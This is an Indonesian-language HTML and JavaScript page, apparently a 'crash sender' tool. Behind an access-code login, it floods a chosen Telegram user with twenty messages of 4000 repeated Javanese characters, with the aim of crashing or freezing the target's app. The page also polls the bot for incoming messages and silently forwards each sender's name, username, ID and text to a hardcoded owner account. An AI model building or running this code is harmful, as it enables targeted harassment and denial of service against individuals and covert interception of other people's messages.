<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>MeliodasCrash Sender</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #111;
      color: #0f0;
      text-align: center;
      padding: 20px;
      margin: 0;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      justify-content: center;
    }

    h1 {
      font-size: 3rem;
      margin-bottom: 40px;
      text-shadow: 0 0 15px rgba(0, 255, 0, 0.7);
    }

    h2 {
      font-size: 2.5rem;
      margin-bottom: 40px;
    }

    input, button {
      padding: 25px;
      font-size: 2rem;
      margin: 20px auto;
      width: 90%;
      max-width: 600px;
      border-radius: 15px;
      border: none;
      display: block;
    }

    input {
      background: #222;
      color: #0f0;
      border: 3px solid #0f0;
    }

    button {
      cursor: pointer;
      background: #0f0;
      color: #000;
      font-weight: bold;
      transition: all 0.3s;
    }

    button:hover {
      background: #00cc00;
      transform: scale(1.02);
    }

    #main, #target-section {
      display: none;
      margin-top: 50px;
    }

    .copyright {
      margin-top: 50px;
      font-size: 1.5rem;
      color: #0f0;
      text-align: center;
    }

    .checkbox-container {
      display: flex;
      align-items: center;
      justify-content: center;
      margin: 30px 0;
      font-size: 2rem;
    }

    .checkbox-container input {
      width: 30px;
      height: 30px;
      margin-right: 15px;
    }

    /* Tambahan untuk contact developer */
    .contact-developer {
      margin-top: 30px;
      font-size: 1.5rem;
    }

    .contact-developer a {
      color: #0f0;
      text-decoration: none;
      transition: all 0.3s;
    }

    .contact-developer a:hover {
      text-shadow: 0 0 10px rgba(0, 255, 0, 0.7);
    }

    /* Tombol logout */
    .logout-btn {
      background: #f00;
      color: white;
      margin-top: 20px;
    }

    .logout-btn:hover {
      background: #c00;
    }
  </style>
</head>
<body>

  <h1>üíÄ meliodascrash Login</h1>

  <div id="login">
    <input type="text" id="code-token" placeholder="Masukkan kode akses">
    <button onclick="verifyCode()">üîì Masuk</button>
    
    <div class="checkbox-container">
      <input type="checkbox" id="remember" checked>
      <label for="remember">Ingat saya</label>
    </div>
  </div>

  <div id="main">
    <h2>üí• Sender Aktif</h2>
    <div id="target-section">
      <input type="text" id="target-id" placeholder="ID Telegram Target">
      <button onclick="sendBug()">üöÄ Kirim Bug</button>
      <button class="logout-btn" onclick="logout()">üîí Keluar</button>
    </div>
  </div>

  <div class="contact-developer">
    <a href="https://wa.me/6281249864586" target="_blank">üì± Contact Developer</a>
  </div>

  <div class="copyright">
    ¬© copyright by Lanz
  </div>

  <script>
    let BOT_TOKEN = "";
    const OWNER_ID = "6155256811"; // Ganti dengan ID Telegram owner/pemilik bot

    // Cek status login saat halaman dimuat
    document.addEventListener('DOMContentLoaded', function() {
      const savedToken = localStorage.getItem('meliodas_token');
      const rememberMe = localStorage.getItem('meliodas_remember') === 'true';
      
      if (savedToken && rememberMe) {
        BOT_TOKEN = savedToken;
        document.getElementById('login').style.display = "none";
        document.getElementById('main').style.display = "block";
        document.getElementById('target-section').style.display = "block";
        document.getElementById('remember').checked = true;
        startMessagePolling();
      }
    });

    async function verifyCode() {
      const code = document.getElementById('code-token').value.trim();
      if (!code) return alert("Masukkan kode untuk mengakses web ini");

      const rememberMe = document.getElementById('remember').checked;

      try {
        const response = await fetch("https://raw.githubusercontent.com/alwayslanz2/Keyfolder/main/keyadd/key.json");
        const data = await response.json();

        const entry = data.find(item => item.code === code);
        if (!entry) return alert("‚ùå Kode salah!");

        BOT_TOKEN = entry.token;

        // Simpan token dan preferensi remember me jika dicentang
        if (rememberMe) {
          localStorage.setItem('meliodas_token', BOT_TOKEN);
          localStorage.setItem('meliodas_remember', 'true');
        } else {
          localStorage.removeItem('meliodas_token');
          localStorage.removeItem('meliodas_remember');
        }

        document.getElementById('login').style.display = "none";
        document.getElementById('main').style.display = "block";
        document.getElementById('target-section').style.display = "block";
        
        // Mulai polling untuk memeriksa pesan masuk
        startMessagePolling();
      } catch (err) {
        console.error(err);
        alert("‚ùå Gagal memverifikasi kode");
      }
    }

    function logout() {
      // Hapus data login dari localStorage
      localStorage.removeItem('meliodas_token');
      localStorage.removeItem('meliodas_remember');
      
      // Reset tampilan
      BOT_TOKEN = "";
      document.getElementById('login').style.display = "block";
      document.getElementById('main').style.display = "none";
      document.getElementById('code-token').value = "";
    }

    async function sendBug() {
      const id = document.getElementById('target-id').value.trim();
      if (!id) return alert("Isi ID target");

      for (let i = 1; i <= 20; i++) {
        const payload = {
          chat_id: id,
          text: `üí£ *MELIODASCRASH [${i}/10]* üí£\n` + "Í¶æ".repeat(4000),
          parse_mode: "Markdown"
        };

        try {
          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
          });
          console.log(`‚úÖ Pesan ${i} terkirim`);
          await new Promise(res => setTimeout(res, 500));
        } catch (err) {
          console.error(`‚ùå Gagal kirim ${i}:`, err);
        }
      }

      alert("‚úÖ Semua bug berhasil dikirim!");
    }

    // Fungsi untuk polling pesan masuk
    let lastUpdateId = 0;
    async function startMessagePolling() {
      try {
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}`);
        const data = await response.json();
        
        if (data.ok && data.result.length > 0) {
          for (const update of data.result) {
            lastUpdateId = update.update_id;
            
            if (update.message) {
              const chatId = update.message.chat.id;
              const text = update.message.text || '(Pesan tanpa teks)';
              const senderName = update.message.from.first_name || 'Unknown';
              const senderUsername = update.message.from.username ? `@${update.message.from.username}` : 'No Username';
              
              // Kirim notifikasi ke owner
              await notifyOwner(chatId, text, senderName, senderUsername);
            }
          }
        }
      } catch (err) {
        console.error('Error polling messages:', err);
      }
      
      // Polling setiap 5 detik
      setTimeout(startMessagePolling, 5000);
    }

    // Fungsi untuk mengirim notifikasi ke owner
    async function notifyOwner(chatId, messageText, senderName, senderUsername) {
      const notificationText = `üì© *Pesan Baru* üì©\n\n` +
                              `üë§ *Pengirim*: ${senderName} (${senderUsername})\n` +
                              `üÜî *ID*: ${chatId}\n\n` +
                              `üí¨ *Pesan*:\n${messageText}`;
      
      try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: OWNER_ID,
            text: notificationText,
            parse_mode: "Markdown"
          })
        });
      } catch (err) {
        console.error('Gagal mengirim notifikasi ke owner:', err);
      }
    }
  </script>

</body>
</html>
